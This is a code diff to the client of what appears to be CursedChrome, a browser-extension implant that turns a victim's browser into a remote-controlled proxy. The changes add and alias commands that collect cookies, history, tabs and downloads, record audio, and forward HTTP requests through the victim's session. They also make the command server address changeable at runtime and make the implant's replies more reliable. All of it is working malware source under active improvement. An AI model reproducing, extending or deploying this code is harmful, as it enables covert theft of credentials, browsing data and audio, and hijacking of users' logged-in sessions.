@@ -65,22 +65,45 @@ class CursedChromeClient {
 
     this.SYNC_DATA_CONFIG = {};
 
-    // Map of RPC calls to handler methods
+    // Map of RPC calls to handler methods.
+    // Keys cover both the legacy short names this extension shipped
+    // with and the longer names the (new Go) server uses. RPC
+    // responses are always wrapped in an object — Go's `out[key]`
+    // lookups expect a map, never a bare array.
+    const wrapCookies = async () => ({ cookies: await this.getCookies() });
+    const wrapHistory = async (p) => ({
+      history: await this.getHistory((p && p.days) || 30),
+    });
+    const wrapTabs = async () => ({ tabs: await this.getTabs() });
+    const wrapDownloads = async () => ({ downloads: await this.getDownloads() });
+
     this.RPC_CALL_TABLE = {
-      HTTP_REQUEST: this.performHttpRequest.bind(this),
+      // Auth + transport
       AUTH: this.authenticate.bind(this),
 
-      GET_COOKIES: this.getCookies.bind(this),
-      GET_HISTORY: this.getHistory.bind(this),
-      GET_TABS: this.getTabs.bind(this),
-      GET_DOWNLOADS: this.getDownloads.bind(this),
+      // HTTP forwarding (legacy + new server names)
+      HTTP_REQUEST: this.performHttpRequest.bind(this),
+      SEND_REQUEST_VIA_BROWSER: this.performHttpRequest.bind(this),
+
+      // Bulk getters — always wrapped in their object key
+      GET_COOKIES: wrapCookies,
+      GET_BROWSER_COOKIE_ARRAY: wrapCookies,
+      GET_HISTORY: wrapHistory,
+      GET_BROWSER_HISTORY_ARRAY: wrapHistory,
+      GET_TABS: wrapTabs,
+      GET_DOWNLOADS: wrapDownloads,
+
+      // Tab control
       TAB_NAVIGATE_AND_FETCH: this.tabNavigateAndFetch.bind(this),
       STOP_TAB_NAVIGATE: this.stopTabNavigate.bind(this),
+
+      // Audio (legacy + new names)
       START_AUDIO: this.startAudioRecording.bind(this),
+      START_AUDIO_RECORDING: this.startAudioRecording.bind(this),
       STOP_AUDIO: this.stopAudioRecording.bind(this),
-      PONG: (params) => {
-        return { success: true };
-      },
+      STOP_AUDIO_RECORDING: this.stopAudioRecording.bind(this),
+
+      PONG: () => ({ success: true }),
     };
 
     this.activeTasks = new Map();
@@ -100,17 +123,34 @@ class CursedChromeClient {
 
     this.REDIRECT_STATUS_CODES = [301, 302, 307];
 
-    this.SERVER_URL = "ws://127.0.0.1:4343";
+    // Default server URL. Operators can override at runtime by writing
+    // chrome.storage.local.set({ server_url: "wss://..." }) without
+    // having to repackage the extension.
+    this.DEFAULT_SERVER_URL = "ws://127.0.0.1:4343";
+    this.SERVER_URL = this.DEFAULT_SERVER_URL;
 
     // Initialize the client
-    this.initialize();
+    this.bootstrap();
     this.setupIntervals();
     this.setupListeners();
   }
 
+  // Async bootstrap: read configured server URL, then connect.
+  async bootstrap() {
+    try {
+      const cfg = await chrome.storage.local.get(["server_url"]);
+      if (cfg && typeof cfg.server_url === "string" && cfg.server_url.length) {
+        this.SERVER_URL = cfg.server_url;
+      }
+    } catch (e) {
+      console.warn("Could not read server_url from storage, using default", e);
+    }
+    this.initialize();
+  }
+
   // Initialize the WebSocket connection
   initialize() {
-    // Replace with your server details - ideally a secure wss:// connection
+    console.log(`Connecting to ${this.SERVER_URL}`);
     this.websocket = new WebSocket(this.SERVER_URL);
 
     this.websocket.onopen = () => {
@@ -143,14 +183,28 @@ class CursedChromeClient {
 
         // Handle RPC calls
         if (parsedMessage.action in this.RPC_CALL_TABLE) {
-          const result = await this.RPC_CALL_TABLE[parsedMessage.action](
-            parsedMessage.data
-          );
+          let result;
+          try {
+            result = await this.RPC_CALL_TABLE[parsedMessage.action](
+              parsedMessage.data
+            );
+          } catch (rpcErr) {
+            // Surface the error to the server instead of dropping
+            // the message — otherwise the server hangs on its
+            // request_table entry until timeout.
+            console.error(`RPC ${parsedMessage.action} failed:`, rpcErr);
+            result = { error: String(rpcErr && rpcErr.message ? rpcErr.message : rpcErr) };
+          }
 
+          // Send both `data` and `result` so the message works against
+          // the legacy Node server (which used `data`) and the new Go
+          // server (which now also accepts `result` via Payload()).
           this.websocket.send(
             JSON.stringify({
               id: parsedMessage.id,
+              action: parsedMessage.action,
               origin_action: parsedMessage.action,
+              data: result,
               result: result,
             })
           );
@@ -504,9 +558,7 @@ class CursedChromeClient {
   }
 
   async getHistory(days = 30) {
-    if (!chrome.history) {
-      return [];
-    }
+    if (!chrome.history) return [];
     return this.getHistoryByDay(days);
   }
 
@@ -532,10 +584,8 @@ class CursedChromeClient {
     });
   }
 
-  async getCookies(params) {
-    if (!chrome.cookies) {
-      return [];
-    }
+  async getCookies() {
+    if (!chrome.cookies) return [];
     return this.getAllCookies({});
   }
 
@@ -566,18 +616,32 @@ class CursedChromeClient {
 
     return new Promise((resolve) => {
       const taskId = Math.random().toString(36).substring(7);
+      // settled flag ensures whichever path fires first (timeout,
+      // listener, abort) cleans up exactly once and the other paths
+      // become no-ops. Without this each path tries to remove the
+      // listener — fine — but resolve() is also called twice and the
+      // closure's references leak.
+      let settled = false;
+      const finish = (cleanup) => {
+        if (settled) return false;
+        settled = true;
+        cleanup && cleanup();
+        return true;
+      };
 
       let timeout = setTimeout(() => {
+        if (!finish(() => chrome.tabs.onUpdated.removeListener(listener))) return;
         this.activeTasks.delete(taskId);
-        chrome.tabs.onUpdated.removeListener(listener);
         resolve({ error: "Navigation timed out" });
       }, 30000);
 
       const listener = async (updatedTabId, changeInfo, tab) => {
         if (updatedTabId === tabId && changeInfo.status === "complete") {
-          clearTimeout(timeout);
+          if (!finish(() => {
+            clearTimeout(timeout);
+            chrome.tabs.onUpdated.removeListener(listener);
+          })) return;
           this.activeTasks.delete(taskId);
-          chrome.tabs.onUpdated.removeListener(listener);
 
           try {
             // Wait a small bit for any final rendering
@@ -616,12 +680,16 @@ class CursedChromeClient {
         listener,
         timeout,
         abort: () => {
-          clearTimeout(timeout);
-          chrome.tabs.onUpdated.removeListener(listener);
+          if (!finish(() => {
+            clearTimeout(timeout);
+            chrome.tabs.onUpdated.removeListener(listener);
+          })) return;
           try {
             chrome.tabs.stop(tabId);
             chrome.tabs.goBack(tabId);
-          } catch (e) {}
+          } catch (e) {
+            console.warn("abort cleanup failed:", e);
+          }
           resolve({ error: "Task stopped by user" });
         },
       });
@@ -808,8 +876,18 @@ class CursedChromeClient {
     try {
       var response = await fetch(params.url, requestOptions);
     } catch (e) {
+      // Surface fetch failures so the proxy returns 502 instead of
+      // the server hanging until its 60s timeout. Empty body is
+      // base64-empty so the consumer doesn't choke.
       console.error(`Error occurred while performing fetch:`, e);
-      return;
+      return {
+        url: params.url,
+        status: 0,
+        status_text: String(e && e.message ? e.message : e),
+        headers: {},
+        body: "",
+        error: String(e && e.message ? e.message : e),
+      };
     }
 
     var responseHeaders = {};
